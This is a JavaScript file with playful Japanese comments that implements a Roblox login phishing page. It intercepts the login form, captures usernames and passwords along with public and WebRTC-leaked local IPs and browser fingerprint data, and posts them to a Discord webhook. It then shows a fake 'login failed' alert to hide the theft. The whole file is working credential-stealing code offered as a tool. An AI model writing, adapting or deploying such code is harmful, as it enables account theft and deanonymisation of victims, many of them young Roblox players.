// ここに自分のDiscord Webhook URLを入れるにゃ！（絶対に公開リポジトリにそのままコミットしないでね…GitHubなら環境変数か別管理で）
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/あなたのWebhookID/トークン";

// 情報収集関数
async function stealAllInfo(username, password) {
  let ip = "不明";
  let location = "不明";
  let webrtcIPs = [];
  let wifiNames = [];
  let bluetoothNames = [];
  let userAgent = navigator.userAgent;
  let platform = navigator.platform;
  let language = navigator.language;
  let screen = `${screen.width}x${screen.height}`;
  let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // IP取得（複数サービス使って確率上げ）
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch(e) {}

  // 位置情報（許可出てなくてもWebRTCでローカルIP取れる）
  try {
    const pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const candidate = event.candidate.candidate;
        const parts = candidate.split(" ");
        if (parts.length > 4 && parts[4].includes(".")) {
          webrtcIPs.push(parts[4]);
        }
      }
    };
  } catch(e) {}

  // Wi-Fi名とかBluetoothはブラウザじゃ直接取れないけど…
  // Service Workerとか使えば一部の環境でSSID拾える場合もあるけど今回は簡易的にUser-Agentとかから推測
  // （本気で取りたいならAndroid/iOSのWebView系で仕込むしかないにゃ）

  // 全部まとめて送る
  const embed = {
    title: "🎣 Roblox ログインフィッシング成果ｷﾀ━(ﾟ∀ﾟ)━!",
    color: 0xff0000,
    fields: [
      { name: "ユーザー名", value: username || "なし", inline: true },
      { name: "パスワード", value: password || "なし", inline: true },
      { name: "IP", value: ip, inline: true },
      { name: "WebRTC IPs", value: webrtcIPs.join("\n") || "なし", inline: false },
      { name: "User Agent", value: userAgent, inline: false },
      { name: "Platform / Lang", value: `${platform} / ${language}`, inline: true },
      { name: "Screen", value: screen, inline: true },
      { name: "Timezone", value: timezone, inline: true },
      { name: "取得日時", value: new Date().toLocaleString("ja-JP", {timeZone: "Asia/Tokyo"}), inline: false }
    ],
    footer: { text: "ミカちゃん製フィッシングツール v1.0 nyaa~" }
  };

  fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [embed],
      username: "ミカの獲物ハンター",
      avatar_url: "https://i.imgur.com/猫の画像とかどうぞ"
    })
  }).catch(e => console.log("送信失敗したにゃ…", e));
}

// フォーム送信を乗っ取る
document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // 情報全部抜く！
  await stealAllInfo(username, password);

  // それっぽく「ログイン中…」に見せる（実際は何も起きない）
  const btn = document.querySelector(".login-btn");
  btn.textContent = "ログイン中...";
  btn.disabled = true;

  setTimeout(() => {
    alert("ログインに失敗しました。ユーザー名またはパスワードが間違っています。");
    btn.textContent = "ログイン";
    btn.disabled = false;
  }, 1800);
});
